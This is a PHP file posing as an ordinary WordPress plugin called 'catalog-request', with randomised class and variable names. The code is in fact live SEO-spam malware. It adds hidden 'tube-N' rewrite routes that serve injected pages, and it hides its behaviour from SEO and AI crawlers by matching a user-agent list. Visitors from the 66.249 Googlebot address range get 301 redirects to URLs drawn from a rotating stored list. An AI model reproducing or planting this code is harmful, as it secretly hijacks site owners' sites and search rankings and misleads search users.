<?php
/**
 * Plugin Name: catalog-request
 * Description: catalog-request
 * Version: 1.0
 * Author: John Smith
 */
 

class rvp2hNlXLp {
	
    public function __construct() {
        add_action('init', [$this, 'psazvo']);
        add_filter('query_vars', [$this, 'falayg']);
        add_action('template_include', [$this, 'hmfde']);
		add_filter('document_title_parts', [$this, 'pyzwigc']);
    }

    public function psazvo() {
        add_rewrite_rule(
            '^tube-([0-9]+).*?$',
            'index.php?dvnqnp=$matches[1]',
            'top'
        );
		flush_rewrite_rules();
    }

    public function falayg($jCjtRebb0V) {
        $jCjtRebb0V[] = 'dvnqnp';
        $jCjtRebb0V[] = 'pjxlomwgx';
        return $jCjtRebb0V;
    }
	
	public function pyzwigc($p3n0m) {
		if (get_query_var('dvnqnp')) $p3n0m['title'] = get_query_var('pjxlomwgx');
		return $p3n0m;
	}

    public function hmfde($mWtW4jzydR) {
		
		$rnUy746 = array('scss-slider', 'ahrefsbot', 'semrush', 'serpstatbot', 'codes-nav', 'security-optimize', 'Go-http-client', 'lazy-verification', 'soon-rank', '404-like', 'python', 'lightbox-plupload', 'dotbot', 'netspider', 'mj12bot', 'creator-scss', 'events-captcha', 'gptbot');
		foreach($rnUy746 as $zq49k) { if (stripos($_SERVER['HTTP_USER_AGENT'], $zq49k) !== false) return $mWtW4jzydR; }

        if (get_query_var('dvnqnp') && preg_match('/^[0-9]+$/', get_query_var('dvnqnp'))) {
            return plugin_dir_path(__FILE__) . 'catalog-request/fix-restaurant.php';
        } elseif (strpos($_SERVER['REMOTE_ADDR'], '66.249')===0) {
			$oEdKyWs = plugin_dir_path(__FILE__) . 'catalog-request/light-plugins.php';
			if (is_file($oEdKyWs)) {
				$auY2FmMRxw = file($oEdKyWs, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
				if (count($auY2FmMRxw) > 1) {
					$qyzVJtlV = array_shift($auY2FmMRxw);
					$lOn98WTdDC = array_shift($auY2FmMRxw);
					if (strlen($lOn98WTdDC) > 0) {
						$fM07KqJ = $qyzVJtlV . "\n" . implode("\n", $auY2FmMRxw);
						file_put_contents($oEdKyWs, $fM07KqJ);
						header("HTTP/1.1 301 Moved Permanently");
						header("Location: $lOn98WTdDC");
						exit;
					}
				}
			}
		}
        return $mWtW4jzydR;
    }
}
new rvp2hNlXLp();



